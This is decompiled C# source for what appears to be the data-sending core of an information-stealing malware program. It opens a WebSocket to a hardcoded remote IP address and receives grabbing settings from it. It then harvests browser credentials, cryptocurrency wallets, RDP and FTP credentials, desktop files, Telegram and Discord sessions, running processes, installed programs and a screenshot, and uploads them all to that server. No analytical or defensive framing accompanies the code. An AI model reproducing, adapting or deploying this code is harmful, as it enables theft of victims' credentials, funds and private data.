using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Text;
using System.Threading;
using NoiseMe.Drags.App.Data.Recovery;
using NoiseMe.Drags.App.DTO.Linq;
using NoiseMe.Drags.App.Models;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Communication;
using NoiseMe.Drags.App.Models.Credentials;
using NoiseMe.Drags.App.Models.Delegates;
using NoiseMe.Drags.App.Models.LocalModels;
using NoiseMe.Drags.App.Models.LocalModels.Extensions;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;
using NoiseMe.Drags.App.Models.Requests;
using NoiseMe.Drags.App.Models.SuperSocket.ClientEngine;
using NoiseMe.Drags.App.Models.WebSocket4Net;
using ProtoBuf.Meta;

namespace NoiseMe.Drags.App.Data.Srv
{
	// Token: 0x02000184 RID: 388
	public class Post
	{
		// Token: 0x1700031E RID: 798
		// (get) Token: 0x06000C6E RID: 3182 RVA: 0x0000984D File Offset: 0x00007A4D
		public Dictionary<Func<RequestBase, bool>, Action<RequestBase, WebSocket>> Handlers { get; }

		// Token: 0x1700031F RID: 799
		// (get) Token: 0x06000C6F RID: 3183 RVA: 0x00009855 File Offset: 0x00007A55
		public string Host { get; }

		// Token: 0x17000320 RID: 800
		// (get) Token: 0x06000C70 RID: 3184 RVA: 0x0000985D File Offset: 0x00007A5D
		public WebSocket Server { get; }

		// Token: 0x17000321 RID: 801
		// (get) Token: 0x06000C71 RID: 3185 RVA: 0x00009865 File Offset: 0x00007A65
		// (set) Token: 0x06000C72 RID: 3186 RVA: 0x0000986D File Offset: 0x00007A6D
		public bool Running { get; private set; }

		// Token: 0x17000322 RID: 802
		// (get) Token: 0x06000C73 RID: 3187 RVA: 0x00009876 File Offset: 0x00007A76
		public IList<GH9kf<BrowserProfile>> BrowserCredentialsManagers { get; }

		// Token: 0x17000323 RID: 803
		// (get) Token: 0x06000C74 RID: 3188 RVA: 0x0000987E File Offset: 0x00007A7E
		public IList<GH9kf<ColdWallet>> ColdWalletManagers { get; }

		// Token: 0x17000324 RID: 804
		// (get) Token: 0x06000C75 RID: 3189 RVA: 0x00009886 File Offset: 0x00007A86
		public IList<GH9kf<RdpCredential>> RdpManagers { get; }

		// Token: 0x17000325 RID: 805
		// (get) Token: 0x06000C76 RID: 3190 RVA: 0x0000988E File Offset: 0x00007A8E
		public IList<GH9kf<FtpCredential>> FtpManagers { get; }

		// Token: 0x17000326 RID: 806
		// (get) Token: 0x06000C77 RID: 3191 RVA: 0x00009896 File Offset: 0x00007A96
		public IList<gg3> DesktopFileManagers { get; }

		// Token: 0x06000C78 RID: 3192 RVA: 0x00025888 File Offset: 0x00023A88
		public Post(string IP, string buildID)
		{
			RuntimeTypeModel.Default.AutoAddMissingTypes = true;
			this.AddTypesToSerializer(typeof(CommunicationObject), new Type[]
			{
				typeof(RequestBase),
				typeof(ResponseBase)
			});
			this.AddTypeToSerializer(typeof(RequestBase), typeof(Request<CredentialsRequest>));
			this.AddTypeToSerializer(typeof(RequestBase), typeof(Request<string>));
			this.AddTypeToSerializer(typeof(ResponseBase), typeof(Response<bool>));
			this.AddTypeToSerializer(typeof(ResponseBase), typeof(Response<ClientSettings>));
			this.BrowserCredentialsManagers = new List<GH9kf<BrowserProfile>>
			{
				new Bip(),
				new hhhh6r()
			};
			this.ColdWalletManagers = new List<GH9kf<ColdWallet>>
			{
				new ColdIndetifier()
			};
			this.RdpManagers = new List<GH9kf<RdpCredential>>
			{
				new j6cd()
			};
			this.FtpManagers = new List<GH9kf<FtpCredential>>
			{
				new gg3d()
			};
			this.DesktopFileManagers = new List<gg3>
			{
				new gg3()
			};
			this.BuildID = buildID;
			this.Handlers = new Dictionary<Func<RequestBase, bool>, Action<RequestBase, WebSocket>>();
			this.Host = string.Format("ws://109.234.34.133:2012/websocket", IP, 2012);
			this.Server = new WebSocket(this.Host)
			{
				AutoSendPingInterval = 5000,
				EnableAutoSendPing = true,
				AllowUnstrustedCertificate = true
			};
			this.InitializeSeIntIrver();
			Console.WriteLine("Server is initialized");
		}

		// Token: 0x06000C79 RID: 3193 RVA: 0x0000989E File Offset: 0x00007A9E
		public TaskAction<bool> Piu()
		{
			return AsyncTask.StartNew<bool>(delegate()
			{
				this.Server.Open();
				Console.WriteLine("Opening");
				while (!this.Running)
				{
					Thread.Sleep(100);
				}
				return true;
			});
		}

		// Token: 0x06000C7A RID: 3194 RVA: 0x000098B1 File Offset: 0x00007AB1
		public void HandleWorkCompleted()
		{
			EventHandler onWorkCompleted = this.OnWorkCompleted;
			if (onWorkCompleted == null)
			{
				return;
			}
			onWorkCompleted(this, null);
		}

		// Token: 0x06000C7B RID: 3195 RVA: 0x00025AA0 File Offset: 0x00023CA0
		private void InitializeSeIntIrver()
		{
			this.Running = false;
			this.Server.DataReceived += delegate(object sender, NoiseMe.Drags.App.Models.WebSocket4Net.DataReceivedEventArgs arguments)
			{
				try
				{
					if (arguments.Data.IsNotNull<byte[]>() && arguments.Data.Length != 0)
					{
						CommunicationObject communicationObject = arguments.Data.DeSerializeProto<CommunicationObject>();
						RequestBase requestBase;
						if ((requestBase = (communicationObject as RequestBase)) != null)
						{
							foreach (KeyValuePair<Func<RequestBase, bool>, Action<RequestBase, WebSocket>> keyValuePair in this.Handlers)
							{
								if (keyValuePair.Key(requestBase))
								{
									keyValuePair.Value(requestBase, this.Server);
								}
							}
						}
						ResponseBase response;
						if ((response = (communicationObject as ResponseBase)) != null)
						{
							response.OnResponse();
						}
					}
				}
				catch (Exception arg)
				{
					Console.WriteLine("Invalid JsonMessage data from server. Exception : " + arg);
				}
			};
			this.Server.Opened += delegate(object sender, EventArgs eventArgs)
			{
				this.Running = true;
			};
			this.Server.MessageReceived += delegate(object sender, MessageReceivedEventArgs message)
			{
				Console.WriteLine(message.Message);
			};
			this.Server.Closed += delegate(object sender, EventArgs eventArgs)
			{
				Console.WriteLine("Closesd: " + eventArgs);
			};
			this.Server.Error += delegate(object sender, ErrorEventArgs eventArgs)
			{
				this.Running = false;
			};
		}

		// Token: 0x06000C7C RID: 3196 RVA: 0x00025B50 File Offset: 0x00023D50
		public bool QQu()
		{
			bool result;
			try
			{
				ClientSettings settings = this.RecieveSettings().IsNull(new ClientSettings());
				List<BrowserProfile> browserProfiles = new List<BrowserProfile>();
				List<ColdWallet> wallets = new List<ColdWallet>();
				List<RdpCredential> rdpCredentials = new List<RdpCredential>();
				List<DesktopFile> desktopFiles = new List<DesktopFile>();
				List<FtpCredential> ftpCredentials = new List<FtpCredential>();
				TelegramSession telegramSession = new TelegramSession();
				DiscordSession discordSession = new DiscordSession();
				List<RemoteProcess> processes = new List<RemoteProcess>();
				List<string> programs = new List<string>();
				RemoteClientInformation clientInfo = new RemoteClientInformation();
				ThreadPool.SetMaxThreads(2000, 10000);
				new Thread(delegate()
				{
					Console.WriteLine("ClientInfos parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					clientInfo = ClientInfoHelper.Create(this.BuildID);
					stopwatch.Stop();
					this.clientInfoFlag.Set();
					Console.WriteLine(string.Format("ClientInfos has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate()
				{
					Console.WriteLine("Browsers parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabBrowserCredentials)
					{
						int countCompleted = 0;
						object locker = new object();
						using (IEnumerator<GH9kf<BrowserProfile>> enumerator = this.BrowserCredentialsManagers.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								GH9kf<BrowserProfile> manager = enumerator.Current;
								new Thread(delegate()
								{
									List<BrowserProfile> collection = manager.EnumerateData();
									object locker = locker;
									lock (locker)
									{
										browserProfiles.AddRange(collection);
										int countCompleted = countCompleted;
										countCompleted++;
									}
								}).Start();
							}
						}
						while (countCompleted != this.BrowserCredentialsManagers.Count)
						{
						}
					}
					stopwatch.Stop();
					this.browsersFlag.Set();
					Console.WriteLine(string.Format("Browsers has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate()
				{
					Console.WriteLine("ColdWallets parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabColdWallets)
					{
						foreach (GH9kf<ColdWallet> gh9kf in this.ColdWalletManagers)
						{
							wallets.AddRange(gh9kf.EnumerateData().IsNull(new List<ColdWallet>()));
						}
					}
					stopwatch.Stop();
					this.walletsFlag.Set();
					Console.WriteLine(string.Format("ColdWallets has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate()
				{
					Console.WriteLine("DiscordSession parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabDiscord)
					{
						discordSession = fffsa.TempGet();
					}
					stopwatch.Stop();
					this.discordFlag.Set();
					Console.WriteLine(string.Format("DiscordSession has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate()
				{
					Console.WriteLine("Rdps parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabRdp)
					{
						foreach (GH9kf<RdpCredential> gh9kf in this.RdpManagers)
						{
							rdpCredentials.AddRange(gh9kf.EnumerateData().IsNull<List<RdpCredential>>());
						}
					}
					stopwatch.Stop();
					this.rdpsFlag.Set();
					Console.WriteLine(string.Format("Rdps has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate()
				{
					Console.WriteLine("DesktopFiles parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabDesktopFiles)
					{
						foreach (gg3 gg in this.DesktopFileManagers)
						{
							gg.GrabberSettings = settings.DesktopExtensions;
							desktopFiles.AddRange(gg.EnumerateData());
						}
					}
					stopwatch.Stop();
					this.desktopFlag.Set();
					Console.WriteLine(string.Format("DesktopFiles has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate()
				{
					Console.WriteLine("FTPs parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabFtp)
					{
						foreach (GH9kf<FtpCredential> gh9kf in this.FtpManagers)
						{
							ftpCredentials.AddRange(gh9kf.EnumerateData().IsNull<List<FtpCredential>>());
						}
					}
					stopwatch.Stop();
					this.ftpFlag.Set();
					Console.WriteLine(string.Format("FTPs has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate()
				{
					Console.WriteLine("TelegramSession parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabTelegram)
					{
						telegramSession = Fkf83.Fuul();
					}
					stopwatch.Stop();
					this.telegramFlag.Set();
					Console.WriteLine(string.Format("TelegramSession has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate()
				{
					Console.WriteLine("ListOfProcesses parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					processes = ClientInfoHelper.ListOfProcesses();
					stopwatch.Stop();
					this.processesFlag.Set();
					Console.WriteLine(string.Format("ListOfProcesses has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate()
				{
					Console.WriteLine("ListOfPrograms parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					programs = ClientInfoHelper.ListOfPrograms();
					stopwatch.Stop();
					this.programsFlag.Set();
					Console.WriteLine(string.Format("ListOfPrograms has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				this.telegramFlag.WaitOne();
				this.discordFlag.WaitOne();
				this.processesFlag.WaitOne();
				this.programsFlag.WaitOne();
				this.browsersFlag.WaitOne();
				this.walletsFlag.WaitOne();
				this.rdpsFlag.WaitOne();
				this.desktopFlag.WaitOne();
				this.ftpFlag.WaitOne();
				this.clientInfoFlag.WaitOne();
				Console.WriteLine("CredentialsRequest has been created");
				if (clientInfo == null)
				{
					Environment.Exit(0);
				}
				CredentialsRequest objectToSend = new CredentialsRequest
				{
					ClientInformation = clientInfo,
					BrowserProfiles = browserProfiles,
					ColdWallets = wallets,
					RdpConnections = rdpCredentials,
					DesktopFiles = desktopFiles,
					FtpCredentials = ftpCredentials,
					Telegram = telegramSession,
					Discord = discordSession,
					ProcessList = processes,
					InstalledPrograms = programs,
					Screenshot = ClientInfoHelper.CaptureScreen()
				};
				result = this.Server.ProcessRequest(objectToSend, "Credentials", 600000)();
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000C7D RID: 3197 RVA: 0x00025E34 File Offset: 0x00024034
		public ClientSettings RecieveSettings()
		{
			ClientSettings clientSettings = this.Server.ProcessRequest("", "ParseClientSettings", 600000)();
			clientSettings.DesktopExtensions = (clientSettings.DesktopExtensions ?? new BindingList<string>());
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append("GrabBrowserCredentials: ").Append(clientSettings.GrabBrowserCredentials).AppendLine().Append("GrabColdWallets: ").Append(clientSettings.GrabColdWallets).AppendLine().Append("GrabDesktopFiles: ").Append(clientSettings.GrabDesktopFiles).AppendLine().Append("GrabFtp: ").Append(clientSettings.GrabFtp).AppendLine().Append("GrabRdp: ").Append(clientSettings.GrabRdp).AppendLine().Append("GrabDiscord: ").Append(clientSettings.GrabDiscord).AppendLine().Append("GrabTelegram: ").Append(clientSettings.GrabTelegram).AppendLine().Append("Extensions: ").AppendLine(string.Join(new string(new char[]
			{
				','
			}), clientSettings.DesktopExtensions.ToArray<string>()));
			Console.WriteLine(stringBuilder.ToString());
			return clientSettings.IsNull(new ClientSettings());
		}

		// Token: 0x06000C7E RID: 3198 RVA: 0x00025F7C File Offset: 0x0002417C
		public void AddTypeToSerializer(Type parent, Type type)
		{
			if (type == null || parent == null)
			{
				throw new ArgumentNullException();
			}
			if (!RuntimeTypeModel.Default[parent].GetSubtypes().Any((SubType subType) => subType.DerivedType.Type == type))
			{
				MetaType metaType = RuntimeTypeModel.Default[parent];
				int typeIndex = this._typeIndex;
				this._typeIndex = typeIndex + 1;
				metaType.AddSubType(typeIndex, type);
			}
		}

		// Token: 0x06000C7F RID: 3199 RVA: 0x00025FF4 File Offset: 0x000241F4
		public void AddTypesToSerializer(Type parent, params Type[] types)
		{
			foreach (Type type in types)
			{
				this.AddTypeToSerializer(parent, type);
			}
		}

		// Token: 0x040004D2 RID: 1234
		private int _typeIndex = 100;

		// Token: 0x040004DC RID: 1244
		public EventHandler OnWorkCompleted;

		// Token: 0x040004DD RID: 1245
		private readonly string BuildID;

		// Token: 0x040004DE RID: 1246
		private readonly AutoResetEvent telegramFlag = new AutoResetEvent(false);

		// Token: 0x040004DF RID: 1247
		private readonly AutoResetEvent discordFlag = new AutoResetEvent(false);

		// Token: 0x040004E0 RID: 1248
		private readonly AutoResetEvent processesFlag = new AutoResetEvent(false);

		// Token: 0x040004E1 RID: 1249
		private readonly AutoResetEvent programsFlag = new AutoResetEvent(false);

		// Token: 0x040004E2 RID: 1250
		private readonly AutoResetEvent browsersFlag = new AutoResetEvent(false);

		// Token: 0x040004E3 RID: 1251
		private readonly AutoResetEvent walletsFlag = new AutoResetEvent(false);

		// Token: 0x040004E4 RID: 1252
		private readonly AutoResetEvent rdpsFlag = new AutoResetEvent(false);

		// Token: 0x040004E5 RID: 1253
		private readonly AutoResetEvent desktopFlag = new AutoResetEvent(false);

		// Token: 0x040004E6 RID: 1254
		private readonly AutoResetEvent ftpFlag = new AutoResetEvent(false);

		// Token: 0x040004E7 RID: 1255
		private readonly AutoResetEvent clientInfoFlag = new AutoResetEvent(false);
	}
}
